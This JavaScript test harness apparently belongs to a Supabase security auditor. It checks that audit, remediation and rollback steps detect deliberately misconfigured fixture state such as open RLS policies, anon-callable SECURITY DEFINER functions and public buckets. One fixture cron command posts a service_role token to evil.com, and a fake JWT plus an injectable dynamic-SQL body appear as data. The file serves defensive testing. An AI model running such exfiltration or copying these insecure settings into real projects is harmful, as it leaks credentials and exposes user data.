// Golden vulnerable-fixture harness (spec entry 27 — regression gate for the 360).
//
// Mirrors fixtures/seed.sql as JS fixture data (the check modules are pure —
// they consume DB query results, not live SQL — so we feed the *state* the
// seed.sql describes, row-for-row). Then exercises the full pipeline:
//   audit (run all checks) -> assert findings -> remediate --apply ->
//   apply-again (idempotent) -> rollback -> verify (closure).
//
// The "re-audit" after apply is simulated: since transports are injected
// (no real DB), verifyRemediation's verifyFn returns simulated results.
// In a live run, verify.js re-executes audit() against the real DB.

import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";

import { processTables } from "../scripts/checks/rls.js";
import { probeRpcs } from "../scripts/checks/rpc.js";
import { analyzeFunctionBodies } from "../scripts/checks/function-body.js";
import { processViews } from "../scripts/checks/views.js";
import { processStorage, findBucketConfigIssues } from "../scripts/checks/storage.js";
import { analyzeAuthConfig } from "../scripts/checks/auth.js";
import { processColumnGrants, findExposedSchemas } from "../scripts/checks/grants.js";
import { processEdgeFunctions } from "../scripts/checks/edge_functions.js";
import { processNetworkDb } from "../scripts/checks/network_db.js";
import { processExtensionsCron } from "../scripts/checks/extensions_cron.js";
import { processRealtime } from "../scripts/checks/realtime.js";
import { processDataApi } from "../scripts/checks/data_api.js";
import { classifyDefaultAcls } from "../scripts/checks/default_privileges.js";
import { scanFile } from "../scripts/checks/secrets.js";

import {
  normalizeFinding,
  assembleResult,
  scanForSecrets,
  SEVERITY_RANK,
} from "../scripts/contract.js";
import { validate } from "../scripts/validate.js";
import { remediate, rollbackRemediation, verifyRemediation, planRemediations } from "../scripts/remediate.js";

const SCHEMA_PATH = fileURLToPath(new URL("../schema/finding.schema.json", import.meta.url));
const schema = JSON.parse(readFileSync(SCHEMA_PATH, "utf8"));

// A fake service_role JWT for secrets testing (decoded role = "service_role").
// The check modules redact secrets in evidence — scanForSecrets must stay clean.
const SERVICE_ROLE_JWT =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9." +
  "eyJyb2xlIjoic2VydmljZV9yb2xlIn0." +
  "dGhpcyBpcyBhIHNpZ25hdHVyZSBzdHJpbmc";

// === GOLDEN FIXTURE DATA (mirrors fixtures/seed.sql) ===

// Tables: each row mirrors what audit.js's pg_class/pg_policies query returns.
const fixtureTables = [
  // §1: RLS-ON + USING(true) policy + anon read + PII (cpf) — the USING(true) miss
  {
    table_name: "sensitive_photos",
    rls_enabled: true,
    policies: [
      { policyname: "allow_public_access", cmd: "ALL", roles: "{public}", qual: "true", with_check: null },
    ],
    anon_select: true,
    anon_insert: false,
    anon_delete: false,
    auth_select: false,
    columns: [{ name: "patient_cpf", data_type: "text" }, { name: "url", data_type: "text" }],
    sensitive_columns: ["patient_cpf"],
  },
  // §2: RLS-OFF + anon grants — classic exposure
  {
    table_name: "public_notes",
    rls_enabled: false,
    policies: [],
    anon_select: true,
    anon_insert: true,
    anon_delete: true,
    auth_select: false,
    columns: [{ name: "body", data_type: "text" }, { name: "author_id", data_type: "uuid" }],
    sensitive_columns: [],
  },
  // §3: RLS-ON + permissive INSERT WITH CHECK — write leak
  {
    table_name: "comments",
    rls_enabled: true,
    policies: [
      { policyname: "comments_insert", cmd: "INSERT", roles: "{anon}", qual: null, with_check: "true" },
    ],
    anon_select: false,
    anon_insert: true,
    anon_delete: false,
    auth_select: false,
    columns: [{ name: "body", data_type: "text" }, { name: "user_id", data_type: "uuid" }],
    sensitive_columns: [],
  },
  // §7: RLS-ON, no policies, but column grant exposes email (safe from RLS,
  //      but column-level grant bypasses table-level lock)
  {
    table_name: "user_profiles",
    rls_enabled: true,
    policies: [],
    anon_select: false,
    anon_insert: false,
    anon_delete: false,
    auth_select: false,
    columns: [{ name: "email", data_type: "text" }, { name: "phone", data_type: "text" }],
    sensitive_columns: ["email", "phone"],
  },
];

// Active probe: confirmed leaks return 200 + rows; locked/blocked returns 42501
const tableProbeFn = async (tableName) => {
  if (tableName === "sensitive_photos" || tableName === "public_notes") {
    return { status: 200, rowCount: 3, bytes: 512 };
  }
  return { status: 42501, rowCount: 0, bytes: 0 };
};

// §4: SECURITY DEFINER function, anon-executable, no auth check, dynamic SQL
const fixtureRpcFunctions = [
  {
    function_name: "attach_company_admin",
    prosecdef: true,
    provolatile: "v",
    return_type: "void",
    anon_execute: true,
    auth_execute: false,
    args: [{ name: "account_id", type: "uuid", mode: "i" }],
  },
];

// RPC probe: body executes for anon -> business-error (P0001) = confirmed
const rpcProbeFn = async (fnName) => {
  if (fnName === "attach_company_admin") {
    return { status: 500, body: '{"code":"P0001","message":"access denied"}' };
  }
  return { status: 42501, body: "permission denied" };
};

// §4 (function-body analysis): same function, body has dynamic SQL + no auth check
const fixtureBodyFuncs = [
  {
    function_name: "attach_company_admin",
    prosecdef: true,
    body: "EXECUTE 'SELECT * FROM account_admins WHERE id = ' || account_id",
    config: [], // no SET search_path
    anon_execute: true,
    auth_execute: false,
  },
];

// §5: security-definer view over RLS-locked table, leaks PII to anon
const fixtureViews = [
  {
    view_name: "v_tenant_data",
    matview: false,
    security_invoker: false,
    anon_select: true,
    auth_select: false,
    columns: ["id", "tenant_id", "secret_value"],
  },
];

const viewProbeFn = async (viewName) => {
  if (viewName === "v_tenant_data") return { status: 200, rowCount: 1, bytes: 128 };
  return { status: 42501, rowCount: 0, bytes: 0 };
};

// §6: public bucket + anon INSERT/UPDATE/DELETE/SELECT storage policies
const fixtureBuckets = [
  { id: "media", name: "media", public: true, file_size_limit: null, allowed_mime_types: null },
];
const fixtureStoragePolicies = [
  { policyname: "anon_read", cmd: "SELECT", roles: "{anon}", qual: null, with_check: null },
  { policyname: "anon_upload", cmd: "INSERT", roles: "{anon}", qual: null, with_check: null },
  { policyname: "anon_tamper", cmd: "UPDATE", roles: "{anon}", qual: null, with_check: null },
  { policyname: "anon_wipe", cmd: "DELETE", roles: "{anon}", qual: null, with_check: null },
];

const storageProbeFn = async (bucketId) => {
  if (bucketId === "media") {
    return { list: 200, download: 200, upload: 201, delete: 200, listed: 5, bytes: 512 };
  }
  return { list: 42501, download: 42501, upload: 42501, delete: 42501, listed: 0, bytes: 0 };
};

// §14 (auth): weak auth config (no rate_limit_* keys set -> rate-limit-missing fires)
const fixtureAuthConfig = {
  disable_signup: false,
  mailer_autoconfirm: true,
  external_anonymous_users_enabled: false,
  password_min_length: 6,
  password_required_characters: "",
  security_captcha_enabled: false,
  password_hibp_enabled: false,
  mfa_enabled: false,
  jwt_exp: 36000,
  uri_allow_list: [],
};

// §7: column-level anon SELECT on sensitive column (email)
const fixtureColumnGrants = [
  {
    schema_name: "public",
    table_name: "user_profiles",
    column_name: "email",
    data_type: "text",
    anon_col_select: true,
    auth_col_select: false,
    anon_table_select: false,
    auth_table_select: false,
  },
];

// §8: custom schema exposed via Data API
const fixtureExposedSchemas = ["public", "graphql_public", "custom_integration"];

// §10: edge function with verify_jwt=false + write body
const fixtureEdgeFunctions = [
  {
    id: "ef1",
    name: "public_ingest",
    slug: "public-ingest",
    verify_jwt: false,
    cors: "*",
    body: "supabase.from('events').insert({data: req.body})",
  },
];

// §11: no network restrictions + SSL disabled
const fixtureNetworkConfig = {
  name: "fixture-app",
  network_restrictions: { enabled: false },
  db_ssl: false,
  pool_modes: "session",
};

// §12: http extension + cron job with embedded token + vault readable by anon
const fixtureExtCron = {
  extensions: [{ extname: "http", extversion: "1.0" }],
  cronJobs: [
    {
      jobid: 1,
      schedule: "* * * * *",
      command: `SELECT net.http_post('https://evil.com', 'bearer ${SERVICE_ROLE_JWT}', '{"x":1}')`,
      database: "postgres",
      username: "supabase_admin",
    },
  ],
  vaultGrants: { anon_select: true, auth_select: false },
};

// §9: realtime — public_notes in publication (RLS off) + broadcast writable by anon
const fixtureRealtime = {
  realtimeTables: [
    { table_name: "public_notes", rls_enabled: false, in_publication: true },
  ],
  realtimeMessages: {
    rls_enabled: false,
    anon_select: true,
    anon_insert: true,
    auth_select: false,
    auth_insert: false,
    anon_delete: false,
    has_policies: false,
  },
};

// §13: Data API auto-expose ON with leaky owner roles
const fixtureDataApi = {
  auto_expose: true,
  leaky_owner_roles: ["supabase_admin", "postgres"],
  exposed_schemas: ["public", "custom_integration"],
  table_count: 5,
  function_count: 30,
};

// §12 (secrets): files with committed service_role JWT + NEXT_PUBLIC_ leak
const fixtureSecretFiles = [
  { path: "lib/supabaseClient.js", content: `export const supabase = createClient(url, '${SERVICE_ROLE_JWT}');` },
  { path: ".env", content: `NEXT_PUBLIC_ANON_KEY=${SERVICE_ROLE_JWT}\n` },
];

// === RUN ALL CHECKS AGAINST FIXTURES ===

/** Run every check module against the golden fixtures and return normalized findings. */
async function runGoldenAudit() {
  const findings = [];

  // Tables (RLS + active probe)
  const tableFindings = await processTables(fixtureTables, tableProbeFn);
  for (const f of tableFindings) findings.push(normalizeFinding(f));

  // RPC enumeration + active probe
  const { findings: rpcFindings } = await probeRpcs(fixtureRpcFunctions, rpcProbeFn, true);
  for (const f of rpcFindings) findings.push(normalizeFinding(f));

  // Function body analysis (secdef + no auth check + dynamic SQL)
  const bodyFindings = analyzeFunctionBodies(fixtureBodyFuncs);
  for (const f of bodyFindings) findings.push(normalizeFinding(f));

  // Views (security-definer + PII)
  const viewFindings = await processViews(fixtureViews, viewProbeFn);
  for (const f of viewFindings) findings.push(normalizeFinding(f));

  // Storage: bucket policies + config + public flag
  const storageFindings = await processStorage(fixtureBuckets, fixtureStoragePolicies, storageProbeFn);
  for (const f of storageFindings) findings.push(normalizeFinding(f));

  // Bucket-level public flag (produced inline by audit.js, not storage.js module)
  for (const b of fixtureBuckets) {
    if (b.public) {
      findings.push(normalizeFinding({
        check: "storage_bucket_public",
        category: "coverage-storage",
        severity: "high",
        confidence: "inferred",
        target: `bucket:${b.name}`,
        evidence: { id: b.id, file_size_limit: b.file_size_limit, allowed_mime_types: b.allowed_mime_types },
        fix: {
          sql: [`UPDATE storage.buckets SET public = false WHERE id = '${b.id}';`],
          rollback_sql: [],
          requires_service_role: false,
        },
      }));
    }
  }

  const bucketConfigFindings = findBucketConfigIssues(fixtureBuckets);
  for (const f of bucketConfigFindings) findings.push(normalizeFinding(f));

  // Auth config
  const authFindings = analyzeAuthConfig(fixtureAuthConfig, "fixture-ref");
  for (const f of authFindings) findings.push(normalizeFinding(f));

  // Column grants + exposed schemas
  const colFindings = processColumnGrants(fixtureColumnGrants);
  for (const f of colFindings) findings.push(normalizeFinding(f));
  const schemaFindings = findExposedSchemas(fixtureExposedSchemas);
  for (const f of schemaFindings) findings.push(normalizeFinding(f));

  // Edge functions
  const edgeFindings = processEdgeFunctions(fixtureEdgeFunctions, "fixture-ref");
  for (const f of edgeFindings) findings.push(normalizeFinding(f));

  // Network/DB
  const netFindings = processNetworkDb(fixtureNetworkConfig, "fixture-ref");
  for (const f of netFindings) findings.push(normalizeFinding(f));

  // Extensions/cron/vault
  const extCronFindings = processExtensionsCron(fixtureExtCron, "fixture-ref");
  for (const f of extCronFindings) findings.push(normalizeFinding(f));

  // Realtime
  const realtimeFindings = await processRealtime(fixtureRealtime, "fixture-ref", tableProbeFn);
  for (const f of realtimeFindings) findings.push(normalizeFinding(f));

  // Data API
  const dataApiFindings = processDataApi(fixtureDataApi, "fixture-ref");
  for (const f of dataApiFindings) findings.push(normalizeFinding(f));

  // Default privileges (spec entry 22) — postgres TABLES leak (SQL fix) +
  // supabase_admin leak (dashboard_action, not a failing SQL). Mirrors fixtures/seed.sql.
  const fixtureDefaultPrivs = [
    { owner_role: "postgres", defaclobjtype: "r", acl: "{$_=arwdD/public,anon=arwdD,authenticated=rw}" },
    { owner_role: "supabase_admin", defaclobjtype: "r", acl: "{$_=arwdD/public,anon=arwdD,authenticated=rw}" },
  ];
  const privFindings = classifyDefaultAcls(fixtureDefaultPrivs);
  for (const f of privFindings) findings.push(normalizeFinding(f));

  // Secrets (file-level scan, no live repo walk)
  for (const sf of fixtureSecretFiles) {
    for (const f of scanFile(sf.path, sf.content)) findings.push(normalizeFinding(f));
  }

  return findings;
}

// Expected check names that MUST fire from the golden fixture.
const EXPECTED_CHECKS = new Set([
  // rls.js
  "rls_disabled",
  "rls_permissive_policy",
  "rls_permissive_write_policy",
  // rpc.js
  "rpc_confirmed_executable",
  // function-body.js
  "function_secdef_missing_auth_check",
  "function_secdef_no_search_path",
  "function_secdef_dynamic_sql",
  // views.js
  "view_security_definer_bypass",
  // storage.js
  "storage_bucket_public",
  "storage_objects_anon_insert",
  "storage_objects_anon_tamper",
  "storage_bucket_misconfigured",
  "storage_policy_unscoped_path",
  // auth.js
  "auth_signups_enabled_no_confirm",
  "weak_password_policy",
  "auth_hibp_disabled",
  "auth_mfa_disabled",
  "auth_jwt_exp_too_long",
  "auth_redirect_allowlist_open",
  "auth_rate_limit_missing",
  // grants.js
  "column_grant_exposes_column",
  "custom_schema_exposed",
  // edge_functions.js
  "edge_function_verify_jwt_disabled",
  "edge_function_unauthenticated_write",
  // network_db.js
  "db_no_network_restrictions",
  "db_ssl_disabled",
  // extensions_cron.js
  "extension_risky_installed",
  "cron_job_embedded_secret",
  "vault_decrypted_secrets_exposed",
  // realtime.js
  "realtime_publication_no_rls",
  "realtime_broadcast_anon_read",
  "realtime_broadcast_anon_write",
  // data_api.js
  "data_api_auto_expose_on",
  // default_privileges.js
  "default_privileges_not_revoked",
  // secrets.js
  "committed_service_role_jwt",
  "env_secret_exposed_to_browser",
]);

// === TESTS ===

test("golden harness: audit phase — all expected checks fire from the fixture", async () => {
  const findings = await runGoldenAudit();
  const checks = new Set(findings.map((f) => f.check));

  for (const name of EXPECTED_CHECKS) {
    assert.ok(checks.has(name), `golden fixture missing expected check: ${name}`);
  }
  assert.ok(findings.length >= 25, `expected >=25 findings, got ${findings.length}`);
});

test("golden harness: no secrets leak into the assembled result", async () => {
  const findings = await runGoldenAudit();
  const result = assembleResult({
    project_ref: "fixture-ref",
    mode: "audit-active",
    rawFindings: findings,
    generated_at: "2026-08-27T12:00:00.000Z",
  });
  const json = JSON.stringify(result);
  const leaks = scanForSecrets(json);
  assert.equal(leaks.length, 0, `secrets leaked in output: ${JSON.stringify(leaks)}`);
});

test("golden harness: result passes the finding JSON schema", async () => {
  const findings = await runGoldenAudit();
  const result = assembleResult({
    project_ref: "fixture-ref",
    mode: "audit-active",
    rawFindings: findings,
    generated_at: "2026-08-27T12:00:00.000Z",
  });
  const { valid, errors } = validate(result, schema);
  assert.equal(errors.length, 0, `schema violations: ${JSON.stringify(errors)}`);
});

test("golden harness: critical findings are confirmed (active probe) with PII escalation", async () => {
  const findings = await runGoldenAudit();
  const critical = findings.filter((f) => f.severity === "critical");
  assert.ok(critical.length > 0, "expected at least one critical finding");

  // sensitive_photos: confirmed leak + sensitive column -> critical + confirmed
  const pp = findings.find((f) => f.check === "rls_permissive_policy" && f.target === "sensitive_photos");
  assert.ok(pp, "sensitive_photos should fire rls_permissive_policy");
  assert.equal(pp.severity, "critical");
  assert.equal(pp.confidence, "confirmed");
});

test("golden harness: full cycle — audit -> remediate apply -> apply (idempotent) -> rollback -> verify", async () => {
  // --- AUDIT PHASE ---
  const rawFindings = await runGoldenAudit();
  const result = assembleResult({
    project_ref: "fixture-ref",
    mode: "audit-active",
    rawFindings,
    generated_at: "2026-08-27T12:00:00.000Z",
  });

  // Verify the result is schema-valid and secret-free before remediation.
  assert.deepEqual(validate(result, schema).errors, [], "audit result must pass schema");
  assert.equal(scanForSecrets(JSON.stringify(result)).length, 0, "no secrets in audit result");

  // --- REMEDIATE DRY-RUN ---
  const dryRun = await remediate(result, { dryRun: true, ref: "fixture-ref" });
  assert.equal(dryRun.mode, "dry-run");
  assert.ok(dryRun.plan.length > 0, "dry-run should produce a non-empty plan");
  const dryRunJson = JSON.stringify(dryRun);
  assert.equal(scanForSecrets(dryRunJson).length, 0, "no secrets in dry-run output");

  // --- REMEDIATE APPLY (inject transports, capture snapshot) ---
  let snapContent = null;
  const dbCalls = [];
  const mgmtCalls = [];
  const applyOut = await remediate(result, {
    dryRun: false,
    token: "sbp_test",
    ref: "fixture-ref",
    _dbQuery: async (q) => { dbCalls.push(q); return []; },
    _mgmtRequest: async (m, p, b) => { mgmtCalls.push({ m, p, b }); return {}; },
    _writeSnapshot: (_path, content) => { snapContent = content; },
    verifyFn: async () => ({ verified: true, reason: "simulated: fix applied, re-probe blocked" }),
  });

  assert.equal(applyOut.mode, "apply");
  assert.equal(applyOut.summary.failed, 0, "no remediation failures");
  assert.ok(snapContent, "snapshot must be written on --apply");

  // SQL + management-API findings should have been applied; dashboard-only skipped.
  assert.ok(dbCalls.length > 0, "at least one SQL fix executed");
  assert.ok(mgmtCalls.length > 0, "at least one management-API fix executed");
  // SQL fix calls wrapped in BEGIN/COMMIT (captureState may issue standalone
  // SELECT queries for ACL state capture — those are not BEGIN/COMMIT wrapped).
  const applyCalls = dbCalls.filter((q) => q.startsWith("BEGIN;"));
  assert.ok(applyCalls.length > 0, "at least one SQL fix applied with BEGIN/COMMIT");
  for (const q of applyCalls) {
    assert.ok(q.startsWith("BEGIN;"), "SQL must be wrapped in BEGIN");
    assert.ok(q.endsWith("COMMIT;"), "SQL must end with COMMIT");
  }

  // --- REMEDIATE APPLY AGAIN (idempotency) ---
  const applyOut2 = await remediate(result, {
    dryRun: false,
    token: "sbp_test",
    ref: "fixture-ref",
    _dbQuery: async () => [],
    _mgmtRequest: async () => ({}),
    _writeSnapshot: () => {},
  });
  assert.equal(applyOut2.summary.failed, 0, "second apply must not error (idempotent)");

  // --- ROLLBACK (using the captured snapshot) ---
  const snapshot = JSON.parse(snapContent);
  const rollbackDbCalls = [];
  const rollbackMgmtCalls = [];
  const rollbackOut = await rollbackRemediation(snapshot, {
    token: "sbp_test",
    ref: "fixture-ref",
    _dbQuery: async (q) => { rollbackDbCalls.push(q); return []; },
    _mgmtRequest: async (m, p, b) => { rollbackMgmtCalls.push({ m, p, b }); return {}; },
    _writeSnapshot: () => {},
  });

  assert.equal(rollbackOut.mode, "rollback");
  assert.equal(rollbackOut.summary.failed, 0, "no rollback failures");
  assert.ok(rollbackDbCalls.length > 0, "rollback should execute rollback_sql");
  for (const q of rollbackDbCalls) {
    assert.ok(q.startsWith("BEGIN;"), "rollback SQL must be wrapped in BEGIN");
    assert.ok(q.endsWith("COMMIT;"), "rollback SQL must end with COMMIT");
  }

  // The rollback SQL must be the INVERSE of the fix SQL.
  // e.g. fix="ENABLE ROW LEVEL SECURITY" -> rollback="DISABLE ROW LEVEL SECURITY"
  const rlsDisabled = rollbackDbCalls.some((q) => q.includes("DISABLE ROW LEVEL SECURITY"));
  const hibpRestored = rollbackMgmtCalls.some((c) =>
    c.p.includes("config/auth") && c.b && Object.keys(c.b).some((k) => k.includes("hibp"))
  );
  assert.ok(rlsDisabled, "rollback should restore RLS-off state (DISABLE)");
  assert.ok(hibpRestored, "rollback should restore auth config (hibp=false)");

  // --- ROLLBACK AGAIN (idempotent) ---
  const rollbackOut2 = await rollbackRemediation(snapshot, {
    token: "sbp_test",
    ref: "fixture-ref",
    _dbQuery: async () => [],
    _mgmtRequest: async () => ({}),
    _writeSnapshot: () => {},
  });
  assert.equal(rollbackOut2.summary.failed, 0, "second rollback must not error (idempotent)");

  // --- VERIFY (belt-and-suspenders re-verification) ---
  const plan = planRemediations(result);
  const verifyOut = await verifyRemediation(plan, applyOut.results, async (item) => ({
    verified: true,
    reason: "post-fix re-probe returns 42501 (blocked) — finding closed",
  }));

  // fixed_confirmed = number of applied findings where verifyFn returned true.
  // Skipped findings (no rollback_sql, e.g. storage_bucket_public) and
  // dashboard-only ones are excluded from fixed_confirmed.
  assert.equal(verifyOut.summary.fixed_confirmed, applyOut.summary.applied,
    "all applied findings should be verified closed");
  assert.equal(verifyOut.summary.fixed_unverified, 0);
  // Dashboard-only findings report needs_dashboard
  const dashboardCount = applyOut.results.filter(
    (r) => r.actions.some((a) => a.type === "dashboard_skip")
  ).length;
  assert.equal(verifyOut.summary.needs_dashboard, dashboardCount);
});

test("golden harness: prod ref is hard-blocked for both apply and rollback", async () => {
  const rawFindings = await runGoldenAudit();
  const DUMMY = "test-prod-ref-99999";
  const prevEnv = process.env.SUPA360_BLOCKED_REFS;
  process.env.SUPA360_BLOCKED_REFS = DUMMY;
  try {
    const result = assembleResult({
      project_ref: DUMMY, mode: "audit-active", rawFindings,
      generated_at: "2026-08-27T12:00:00.000Z",
    });
    await assert.rejects(
      async () => remediate(result, {
        dryRun: false, token: "sbp_test", ref: DUMMY,
        _dbQuery: async () => [], _mgmtRequest: async () => ({}), _writeSnapshot: () => {},
      }),
      (err) => err.code === "PROD_REF_BLOCKED"
    );
  } finally {
    process.env.SUPA360_BLOCKED_REFS = prevEnv;
  }
});
